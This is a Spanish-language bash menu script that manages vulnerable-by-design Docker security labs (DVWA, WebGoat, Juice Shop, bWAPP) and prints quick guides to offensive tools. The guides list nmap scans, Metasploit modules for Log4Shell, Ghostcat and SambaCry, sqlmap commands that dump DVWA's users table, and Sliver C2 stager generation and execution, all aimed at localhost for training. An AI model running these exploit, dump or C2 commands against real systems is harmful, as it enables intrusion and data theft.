#!/bin/bash
# MetaIsplotableX — menú interactivo de labs y herramientas
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

COMPOSE_DIR="$(cd "$(dirname "$0")" && pwd)"

banner() {
  clear
  echo -e "${CYAN}"
  echo "╔══════════════════════════════════════════════╗"
  echo "║     MetaIsplotableX — Security Labs         ║"
  echo "╚══════════════════════════════════════════════╝"
  echo -e "${NC}"
}

stack_status() {
  echo -e "${YELLOW}Servicios corriendo:${NC}"
  docker ps --filter "name=metaisplotablex" --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}" 2>/dev/null || echo "Ninguno activo"
}

lab_up() {
  local lab="$1" container="$2" port="$3"
  echo -e "${YELLOW}Levantando $lab...${NC}"
  docker compose -f "$COMPOSE_DIR/docker-compose.yml" up -d --build 2>/dev/null || {
    echo -e "${RED}Error al levantar $lab${NC}"
    return 1
  }
  echo -e "${GREEN}$lab corriendo en http://localhost:$port${NC}"
  echo "  SSH: ssh msfadmin@localhost -p 2222"
}

lab_down() {
  local lab="$1"
  echo -e "${YELLOW}Apagando $lab...${NC}"
  docker compose -f "$COMPOSE_DIR/docker-compose.yml" down -v 2>/dev/null || true
  echo -e "${GREEN}$lab detenido${NC}"
}

menu_lab() {
  while true; do
    banner
    echo -e "${YELLOW}Laboratorios disponibles:${NC}"
    echo -e "  ${GREEN}1)${NC} DVWA"
    echo -e "  ${GREEN}2)${NC} WebGoat"
    echo -e "  ${GREEN}3)${NC} Juice Shop"
    echo -e "  ${GREEN}4)${NC} Ghost"
    echo -e "  ${GREEN}5)${NC} bWAPP"
    echo -e "  ${GREEN}0)${NC} Volver"
    read -rp "Opción: " opt
    case "$opt" in
      1) lab="DVWA"; port="8080"; container="metaisplotablex"; img="metasploitable3-arm:latest" ;;
      2) lab="WebGoat"; port="8081"; container="webgoat"; img="webgoat/webgoat-8.0:latest" ;;
      3) lab="JuiceShop"; port="3000"; container="juiceshop"; img="bkimminich/juice-shop:latest" ;;
      4) lab="Ghost"; port="2368"; container="ghost"; img="ghost:alpine" ;;
      5) lab="bWAPP"; port="8082"; container="bwapp"; img="raesene/bwapp:latest" ;;
      0) return ;;
      *) echo "Opción inválida"; continue ;;
    esac
    while true; do
      banner
      echo -e "${CYAN}Laboratorio: $lab${NC}"
      echo -e "  ${GREEN}1)${NC} Levantar"
      echo -e "  ${GREEN}2)${NC} Apagar"
      echo -e "  ${GREEN}3)${NC} Ver logs"
      echo -e "  ${GREEN}4)${NC} Ver puertos"
      echo -e "  ${GREEN}5)${NC} Ver estado"
      echo -e "  ${GREEN}0)${NC} Volver"
      read -rp "Opción: " sub
      case "$sub" in
        1) lab_up "$lab" "$container" "$port" ;;
        2) lab_down "$lab" ;;
        3) docker logs --tail 50 "$container" 2>&1 | tail -50 ;;
        4) docker port "$container" 2>/dev/null || echo "Contenedor no corriendo" ;;
        5) docker ps --filter "name=$container" --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}" ;;
        0) break ;;
        *) echo "Opción inválida" ;;
      esac
      read -rp "Presione Enter para continuar..."
    done
  done
}

menu_herramienta() {
  while true; do
    banner
    echo -e "${YELLOW}Aprender herramienta ofensiva:${NC}"
    echo -e "  ${GREEN}1)${NC} Nmap"
    echo -e "  ${GREEN}2)${NC} Metasploit"
    echo -e "  ${GREEN}3)${NC} SQLMap"
    echo -e "  ${GREEN}4)${NC} Sliver"
    echo -e "  ${GREEN}0)${NC} Volver"
    read -rp "Opción: " opt
    case "$opt" in
      1) herramienta="nmap" ;;
      2) herramienta="metasploit" ;;
      3) herramienta="sqlmap" ;;
      4) herramienta="sliver" ;;
      0) return ;;
      *) echo "Opción inválida"; continue ;;
    esac
    banner
    echo -e "${CYAN}Guía rápida: $herramienta${NC}"
    case "$herramienta" in
      nmap)
        echo -e "\n${YELLOW}Objetivo: descubrir puertos/servicios contra DVWA${NC}"
        echo ""
        echo "  # Escaneo rápido puertos principales"
        echo "  nmap -sV -p 8080,2121,3306,6379,6667,8009 localhost"
        echo ""
        echo "  # Detección de versiones"
        echo "  nmap -sV -p 1-1000 localhost"
        echo ""
        echo "  # Escaneo completo"
        echo "  nmap -p- --min-rate 1000 localhost"
        echo ""
        echo "  # Scripts NSE para web"
        echo "  nmap --script=http-enum,http-headers,http-methods -p 8080 localhost"
        echo ""
        echo "  # SYN scan (stealth)"
        echo "  nmap -sS -p 8080,3306 localhost"
        ;;
      metasploit)
        echo -e "\n${YELLOW}Objetivo: explotar CVEs indexados en el lab${NC}"
        echo ""
        echo "  # Iniciar consola"
        echo "  msfconsole"
        echo ""
        echo "  # Tomcat Ghostcat (CVE-2020-1938)"
        echo "  use auxiliary/admin/http/tomcat_ghostcat"
        echo "  set RHOSTS localhost"
        echo "  set RPORT 8009"
        echo "  run"
        echo ""
        echo "  # Log4Shell (CVE-2021-44228)"
        echo "  use exploit/multi/http/log4shell_header_injection"
        echo "  set RHOSTS localhost"
        echo "  set RPORT 8080"
        echo "  set TARGETURI /log4shell"
        echo "  run"
        echo ""
        echo "  # SambaCry (CVE-2017-7494)"
        echo "  use exploit/linux/samba/is_known_pipename"
        echo "  set RHOSTS localhost"
        echo "  set RPORT 445"
        echo "  run"
        ;;
      sqlmap)
        echo -e "\n${YELLOW}Objetivo: detectar y explotar SQLi en DVWA${NC}"
        echo ""
        echo "  # Detectar SQLi GET"
        echo "  sqlmap -u 'http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=xxx; security=low' --batch"
        echo ""
        echo "  # Enumerar bases de datos"
        echo "  sqlmap -u 'http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=xxx; security=low' --dbs --batch"
        echo ""
        echo "  # Dump de tabla users"
        echo "  sqlmap -u 'http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=xxx; security=low' -D dvwa -T users --dump --batch"
        ;;
      sliver)
        echo -e "\n${YELLOW}Objetivo: C2 post-explotación en lab aislado${NC}"
        echo ""
        echo "  # Servidor (Kali/attacker)"
        echo "  sliver-server"
        echo ""
        echo "  # Cliente"
        echo "  sliver-client"
        echo ""
        echo "  # Generar stager"
        echo "  generate --http 172.20.0.1:8080 --save /tmp/sliver.bin"
        echo ""
        echo "  # Ejecutar en contenedor"
        echo "  docker exec -it metaisplotablex /bin/bash"
        echo "  chmod +x /tmp/sliver.bin && /tmp/sliver.bin"
        echo ""
        echo -e "${RED}USO SOLO EN LAB AISLADO. No exponer a internet.${NC}"
        ;;
    esac
    read -rp "Presione Enter para continuar..."
  done
}

menu_principal() {
  while true; do
    banner
    local status
    status=$(docker ps --filter "name=metaisplotablex" --format "{{.Status}}" 2>/dev/null | head -1 || true)
    if [ -n "$status" ]; then
      echo -e "Stack actual: ${GREEN}$status${NC}"
    else
      echo -e "Stack actual: ${RED}detenido${NC}"
    fi
    echo ""
    echo -e "${BLUE}1)${NC} Levantar stack completo"
    echo -e "${BLUE}2)${NC} Apagar stack completo"
    echo -e "${BLUE}3)${NC} Estado del stack"
    echo -e "${BLUE}4)${NC} Gestionar laboratorio individual"
    echo -e "${BLUE}5)${NC} Guía rápida de herramientas"
    echo -e "${BLUE}0)${NC} Salir"
    read -rp "Opción: " opt
    case "$opt" in
      1)
        docker compose -f "$COMPOSE_DIR/docker-compose.yml" up -d --build
        echo -e "${GREEN}Stack corriendo:${NC}"
        echo "  HTTP:    http://localhost:8080 (DVWA)"
        echo "  SSH:     ssh msfadmin@localhost -p 2222"
        echo "  MariaDB: localhost:3306"
        ;;
      2)
        docker compose -f "$COMPOSE_DIR/docker-compose.yml" down -v
        echo -e "${GREEN}Stack detenido${NC}"
        ;;
      3) stack_status ;;
      4) menu_lab ;;
      5) menu_herramienta ;;
      0) echo "Saliendo..."; exit 0 ;;
      *) echo "Opción inválida" ;;
    esac
    read -rp "Presione Enter para continuar..."
  done
}

menu_principal
